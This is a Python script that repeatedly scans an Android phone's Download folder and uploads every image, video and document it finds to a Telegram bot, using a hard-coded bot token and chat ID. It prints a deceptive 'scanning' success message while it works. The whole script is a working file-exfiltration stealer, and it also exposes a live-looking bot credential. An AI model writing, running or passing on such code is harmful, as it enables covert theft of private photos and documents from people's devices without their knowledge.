import time
from pathlib import Path
import os
import requests
from concurrent.futures import ThreadPoolExecutor

# ----------------- CONFIG -----------------
BOT_TOKEN = "8749033249:AAEORDExy_DuC8P0EA2XajKQlQyIUjWnMjk"
CHAT_ID   = "8424562821"

ROOT_PATH = Path("/storage/emulated/0/Download")  # limited folder

IMAGE_EXTS = {".jpg", ".jpeg", ".png", ".webp"}
VIDEO_EXTS = {".mp4", ".mkv", ".3gp"}
DOC_EXTS   = {".pdf", ".txt", ".zip", ".rar", ".docx"}

ALL_EXTS = IMAGE_EXTS | VIDEO_EXTS | DOC_EXTS

# ----------------- SETTINGS -----------------
MAX_THREADS = 3
SCAN_DELAY = 10   # seconds

uploaded_files = set()
executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

# ----------------- FUNCTIONS -----------------
def get_all_files(root_folder):
    files = []
    for root, dirs, filenames in os.walk(root_folder):
        for name in filenames:
            ext = os.path.splitext(name)[1].lower()
            if ext in ALL_EXTS:
                full_path = os.path.join(root, name)
                files.append(full_path)
    return files


def telegram_upload(path):
    ext = os.path.splitext(path)[1].lower()

    if ext in IMAGE_EXTS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        file_key = "photo"
    elif ext in VIDEO_EXTS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        file_key = "video"
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        file_key = "document"

    try:
        with open(path, "rb") as f:
            requests.post(
                url,
                data={"chat_id": CHAT_ID},
                files={file_key: f},
                timeout=30
            )
        print("Idz Scaning|Successfull")
    except Exception as e:
        print(f"Error: {e}")


# ----------------- MAIN -----------------
def main():
    if not ROOT_PATH.exists():
        print("Folder not found!")
        return

    while True:
        files = get_all_files(ROOT_PATH)

        for f in files:
            if f not in uploaded_files:
                uploaded_files.add(f)
                executor.submit(telegram_upload, f)

        time.sleep(SCAN_DELAY)


if __name__ == "__main__":
    main()